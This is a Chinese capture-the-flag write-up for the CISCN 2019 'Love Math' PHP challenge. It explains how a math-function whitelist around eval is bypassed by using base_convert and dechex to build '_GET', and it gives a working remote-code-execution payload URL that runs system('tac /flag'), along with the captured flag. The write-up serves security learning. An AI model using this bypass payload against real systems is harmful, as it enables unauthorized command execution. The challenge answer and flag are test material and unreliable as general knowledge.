# [CISCN 2019 初赛]Love Math

[题目地址](http://50e88fc4-4d5a-4c55-a152-53ee8656cbfc.node4.buuoj.cn:81/)

```php
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

看见eval就知道getshell题。[preg_match_all](https://www.php.net/manual/zh/function.preg-match-all.php)全局搜索匹配正则的所有内容，$used_funcs[0]是包含匹配完整模式的字符串的数组。这次过滤用的是白名单而不是黑名单，代表我们一定要在一堆数学函数中构造出getshell命令。还有长度限制，要求内容长度小于等于80个字符。那就需要利用一个php的特性了。

- 动态函数
> php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数<br>例如：`$function = "phpinfo";$function();`会执行phpinfo。

配合另一个技巧_GET。我们完全可以构造一个这样的payload：`$_GET[0]($_GET[1])`，用较少的字符实现任意shell。然而很多字符都用不了，[wp](https://www.cnblogs.com/20175211lyz/p/11588219.html)提供了3种方法。其中一种如下：

- http://50e88fc4-4d5a-4c55-a152-53ee8656cbfc.node4.buuoj.cn:81/?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=tac%20/flag

关键思路就是利用白名单内已有的函数构造出`_GET`：

```php
//hex2bin
echo base_convert(37907361743,10,36);
//5f474554
echo dechex(1598506324);
//_GET
echo hex2bin("5f474554");
```

那么拆解payload就得到：

```
$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})
$pi=hex2bin("5f474554")=>_GET
$$pi取出真正的_GET数组，$p得到的_GET只是字符串；因为[]被禁了就用{}代替，最后的得：
(_GET){pi}((_GET){abs})
也就是刚才提到的任意shell
```

后面get再传入参数就能得到flag了。

## Flag
> flag{9cbb62d3-0229-458e-b9bf-696521eeff4c}